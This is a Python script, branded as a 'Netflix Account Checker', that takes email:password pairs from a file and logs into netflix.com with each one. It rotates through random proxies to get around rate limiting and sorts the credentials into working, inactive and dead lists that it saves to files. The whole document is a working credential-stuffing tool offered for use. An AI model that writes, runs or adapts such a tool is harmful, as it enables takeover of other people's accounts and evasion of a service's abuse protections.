#!/usr/bin/python3
# coding: utf-8

from __future__ import division

from os import path
from random import randint
from time import sleep

from mechanize import Browser
from progressbar import ProgressBar

working = []
dead = []
inactive = []
current_proxy = None
response = None
br = Browser()


def test_account(email, password, type_proxy):
    global br, current_proxy, response

    logout_url = "https://www.netflix.com/SignOut?lnkctr=mL"
    page = "Sorry, we are unable to process your request."
    while page.find("Sorry, we are unable to process your request.") != -1:
        try:
            proxies()
            login_url = "https://www.netflix.com/login"
            br.set_handle_equiv(True)
            br.set_handle_redirect(True)
            br.set_handle_referer(True)
            br.set_handle_robots(False)
            br.addheaders = [("User-agent", "Firefox")]
            if current_proxy != "":
                if type_proxy != "HTTP":
                    br.set_proxies({"socks5": current_proxy})
                else:
                    br.set_proxies({"HTTP": current_proxy})
            else:
                br.set_proxies()
            br.open(login_url)
            br.select_form(nr=0)
            br.form["userLoginId"] = email
            br.form["password"] = password
            response = br.submit()

            if response.code == 200:
                page = response.read().decode()
                if page.find("Sorry, we are unable to process your request.") != -1:
                    pass
                elif response.geturl().find("browse") != -1:
                    br.open(logout_url)
                    working.append(email + ":" + password + "\n")
                elif page.find("Finish Sign-up") != -1:
                    br.open(logout_url)
                    inactive.append(email + ":" + password)
                elif response.geturl().find("getstarted") != -1:
                    br.open(logout_url)
                    inactive.append(email + ":" + password)
                elif response.code == 500:
                    error_file = open("error_log.txt", "a+", encoding="utf-8")
                    error_file.write("500-Bad Gateway: currentProxy\n")
                    error_file.close()
                elif page.find("Incorrect password") != -1:
                    dead.append(email + ":" + password)
                elif page.find("find an account with this email address.") != -1:
                    dead.append(email + ":" + password)
                elif page.find("Please try again later.") != -1:
                    error_file = open("error_log.txt", "a+", encoding="utf-8")
                    error_file.write("Too many request, need to use a proxy\n")
                    error_file.close()
                else:
                    print("Unknown Error. (7)")
                    error_file = open("error_log.txt", "a+", encoding="utf-8")
                    error_file.write(response.geturl() + "\n" + page)
                    error_file.close()
            else:
                print("Error:", str(response.code), "Trying again.")
        except Exception as e:
            print("\n\n", e)
            exit(1)
        else:
            if response.geturl().find("getstarted") != -1:
                print(response.geturl().find("getstarted"))
                error_file = open("error_log.txt", "a+", encoding="utf-8")
                error_file.write(response.geturl() + "\n" + page)
                error_file.close()
                br.open(logout_url)
                sleep(3)


def write_to_file():
    global working, dead, inactive

    working_accounts = open("working_accounts.txt", "w+", encoding="utf-8")
    dead_accounts = open("dead_accounts.txt", "w+", encoding="utf-8")
    inactive_accounts = open("inactive_accounts.txt", "w+", encoding="utf-8")
    for acc in working:
        working_accounts.write(acc)
    for acc in dead:
        dead_accounts.write(acc)
    for acc in inactive:
        inactive_accounts.write(acc)
    working_accounts.close()
    dead_accounts.close()
    inactive_accounts.close()
    print("\nSummary:")
    print("--------\n")
    print("Working accounts:", str(len(working)))
    print("Inactive Accounts:", str(len(inactive)))
    print("Dead accounts:", str(len(dead)), "\n")


def proxies():
    global current_proxy
    proxy_file = "proxies_list.txt"
    if path.exists(proxy_file) and path.getsize(proxy_file) > 0:
        lines = open(proxy_file, "r")
        filestream = open(proxy_file, "r")
        random_proxy_id = randint(0, sum(1 for _ in lines) - 1)
        for proxy_id, proxy in enumerate(filestream):
            if proxy_id == random_proxy_id:
                current_proxy = proxy
                break
        filestream.close()
    else:
        current_proxy = ""


def main():
    global working, dead

    print("\n########################################################")
    print("####             Netflix Account Checker            ####")
    print("####             Original by Abdes Salam            ####")
    print("####                                                ####")
    print("####              Recoded by Ceci Cifu              ####")
    print("####                                                ####")
    print("####                 DZ FAMILY TECH                 ####")
    print("########################################################\n")

    try:
        accounts = "check_accounts.txt"
        if path.exists(accounts) and path.getsize(accounts) > 0:
            progress = 0
            max_value = sum(1 for _ in open(accounts))
            pbar = ProgressBar(max_value=max_value).start()
            with open(accounts, "r") as filestream:
                for line in filestream:
                    pbar.update(progress)
                    progress += 1
                    account_argument = line.split(":")
                    args = len(account_argument)
                    if args == 3 or args == 2:
                        email = account_argument[0]
                        password = account_argument[1]
                        test_account(email, password, "HTTP")
                    else:
                        print("Account List is not formatted properly.")

            pbar.finish()
            write_to_file()
        else:
            print("Accounts file is empty!\n")
    except Exception as e:
        print("\n", e)
        print("An error occurred.. Saving progress..")
        write_to_file()


if __name__ == "__main__":
    main()
